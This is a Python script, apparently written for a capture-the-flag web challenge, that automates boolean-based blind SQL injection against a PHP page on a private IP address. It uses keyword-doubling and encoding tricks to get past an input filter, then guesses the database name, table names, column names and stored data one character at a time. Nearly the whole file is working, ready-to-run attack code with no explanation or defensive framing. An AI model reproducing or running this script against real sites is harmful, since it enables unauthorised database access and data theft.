# -*- coding: utf-8 -*-
import re
import requests

MAX = 100 # 最大测试次数
DOMAIN = "http://10.103.247.3:11120/index.php?id=1"
STRING = "hey there"
COOKIE = {"PHPSESSID":"9kn7egcgch08gj53nplono53r6"}

bypass = {
    "and" : "%26%26",
    "or" : "oorr",
    "select" : "selselectect",
    "from" : "frfromom"
}

def url_replace(url):
    # 根据bypass表 转换成能绕过的url
    for old, new in bypass.items():
        url = url.replace(old, new)
    return url

def get_response(url, DEBUG=0):
    url = url_replace(url)
    url = DOMAIN + url
    response = requests.get(url, cookies=COOKIE)
    response.encoding = 'utf-8'
    length = len(response.text)
    text = response.text
    if DEBUG == 1:
        print(length)
    elif DEBUG == 2:
        print(url)
    elif DEBUG == 3:
        print(url)
        print(text)
    match = re.search(STRING, text)
    # print(match)
    if match != None:
        return True
    return False

## db
def get_db_name_len(DEBUG=0):
    url_template = "' and length(database())={0} %23"
    for i in range(1, MAX+1):
        url = url_template.format(i)
        if get_response(url, DEBUG):
            db_len = i
            break
        if i == MAX:
            print("ERROR: get_db_name_len() seems go die !!!")
            raise
    print("Database() length: " + str(db_len))
    return db_len

def get_db_name(db_len, DEBUG=0):
    result = ""
    # 逐位猜字符
    url_template = "' and ascii(substr(database(),{0},1))={1} %23"
    for i in range(1, db_len+1):
        for char in CHARS:
            char_ascii = ord(char) # 返回char的十进制整数
            url = url_template.format(i, char_ascii)
            if get_response(url, DEBUG):
                result += char
                break
    print("Database() name: " + result)

## table&column&data common
def get_TC_num(url_template, DEBUG=0):
    for i in range(0, MAX+1):
        url = url_template.format(i)
        if not get_response(url, DEBUG):
            break
        num = i + 1
        if i == MAX:
            print("ERROR: get_TC_num() seems go die !!!")
            raise
    return num

def get_TCD_name_len(url_template, DEBUG=0):
    name_len = 0
    for i in range(1, MAX+1):
        url = url_template.format(i)
        if not get_response(url, DEBUG):
            break
        name_len = i
        if i == MAX:
            print("ERROR: get_TC_num() seems go die !!!")
            raise
    return name_len  

def get_TCD_name(url_template, name_len, DEBUG=0):
    result = ""
    for i in range(1, name_len + 1):
        for char in CHARS:
            char_ascii = ord(char)
            url = url_template.format(i, char_ascii)
            if get_response(url, DEBUG):
                result += char
                break
    if DEBUG != 0:
        print(result)
    return result

## table
def get_table_num(DEBUG=0):
    # 表名第一位有字符=>有表
    # where table_schema=database() 
    url_template = \
        "' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {0},1),1,1))>0 %23"
    table_num = get_TC_num(url_template, 0)
    print("Table num: " + str(table_num))
    return table_num

def get_table_name_len(table_no, DEBUG=0):
    url_template = \
        "' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit "\
        + str(table_no) + ",1),{0},1))>0 %23"
    table_name_len = get_TCD_name_len(url_template, DEBUG)
    return table_name_len

def get_table_name(table_no, DEBUG=0):
    table_name_len = get_table_name_len(table_no)
    url_template = \
        "' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit "\
        + str(table_no) + ",1),{0},1))={1} %23"
    result = get_TCD_name(url_template, table_name_len, DEBUG)
    return result

## column
def get_column_num(table_name, DEBUG=0):
    # 表名第一位有字符=>有表
    url_template = \
        "' and ascii(substr((select column_name from information_schema.columns where table_name='" \
        + table_name + "' limit {0},1),1,1))>0 %23"
    column_num = get_TC_num(url_template, DEBUG)
    print("Column num: " + str(column_num))
    return column_num

def get_column_name_len(table_name, column_no, DEBUG=0):
    url_template = \
        "' and ascii(substr((select column_name from information_schema.columns where table_name='" \
        + table_name + "' limit " + str(column_no) + ",1),{0},1))>0 %23"
    column_name_len = get_TCD_name_len(url_template, DEBUG)
    return column_name_len

def get_column_name(table_name, column_no, DEBUG=0):
    column_name_len = get_column_name_len(table_name, column_no)
    url_template = \
        "' and ascii(substr((select column_name from information_schema.columns where table_name='" \
        + table_name + "' limit " + str(column_no) + ",1),{0},1))={1} %23"
    column_name = get_TCD_name(url_template, column_name_len, DEBUG)
    return column_name

## data
def get_data_len(table_name, column_name, DEBUG=0):
    url_template = \
        "' and ascii(substr((select " + column_name + " from " + table_name \
        + " ),{0},1))>0 %23"
    data_len = get_TCD_name_len(url_template, DEBUG)
    return data_len

def get_data(table_name, column_name, DEBUG=0):
    data_len = get_data_len(table_name, column_name, DEBUG)
    url_template = \
        "' and ascii(substr((select " + column_name + " from " + table_name \
        + " ),{0},1))={1} %23"
    data = get_TCD_name(url_template, data_len, DEBUG)
    return data


## Sum
def db_info():
    db_len = get_db_name_len(DEBUG=0)
    get_db_name(db_len, DEBUG=0)

def table_info(COLUMNS=False, DATA=False):
    table_num = get_table_num(DEBUG=0)
    table_name = []
    for i in range(table_num):
        name = get_table_name(i, DEBUG=0)
        table_name.append(name)
        if COLUMNS:
            print("--------------------Table : " + name)
            column_info(name, DATA)
    if not COLUMNS:
        print("Tables : " + str(table_name))

def column_info(table_name, DATA=False):
    column_num = get_column_num(table_name, DEBUG=0)
    column_name = []
    for i in range(column_num):
        name = get_column_name(table_name, i, DEBUG=0)
        column_name.append(name)
        if DATA:
            print("----------Column : " + name)
            data_info(table_name, name)
    if not DATA:
        print("Columns : " + str(column_name))

def data_info(table_name, column_name):
    data = get_data(table_name, column_name, DEBUG=0)
    print("------Data: " + data)

## main
def main():
    # db_info()
     table_info(COLUMNS=True, DATA=False)
    # column_info("flag", DATA=True)
    # data_info("flag", "flag")

if __name__ == "__main__":
    CHARS = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_{}"
    LENGTH = 1
    URL = 2
    TEXT = 3
    main()